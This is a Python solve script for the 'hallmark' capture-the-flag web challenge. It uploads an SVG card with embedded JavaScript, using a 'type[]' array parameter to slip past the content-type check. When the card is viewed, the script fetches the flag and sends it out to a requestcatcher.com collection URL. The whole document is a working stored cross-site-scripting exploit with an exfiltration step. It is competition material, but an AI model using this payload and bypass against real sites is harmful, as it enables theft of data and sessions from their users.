import requests
import re

# base_url = "http://localhost:8088"
base_url = "https://hallmark.web.actf.co"

bad_svg = """<?xml version="1.0"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xl="http://www.w3.org/1999/xlink" version="1.1" width="400pt" height="400pt">
  <script>
    fetch("/flag")
    .then((response) => response.text())
    .then((text) => {
      document.location = "https://[YOUR].requestcatcher.com/c?=" + text;
    });
  </script>
</svg>"""

def get_id(url):
  match = re.search(r'id=([\w-]+)', url)
  assert match
  return match.group(1)

def post_card():
  payload = {'svg': 'image/svg+xml', 'content': ''}
  response = requests.post(base_url+"/card", data=payload, allow_redirects=True)
  id = get_id(response.url)
  return id

def put_card(id):
  payload = {'type[]':'image/svg+xml', 'id': id, 'content': bad_svg}
  response = requests.put(base_url+"/card", data=payload)


def solve():
  id = post_card()
  put_card(id)
  print(base_url+"/card?id="+id)

solve()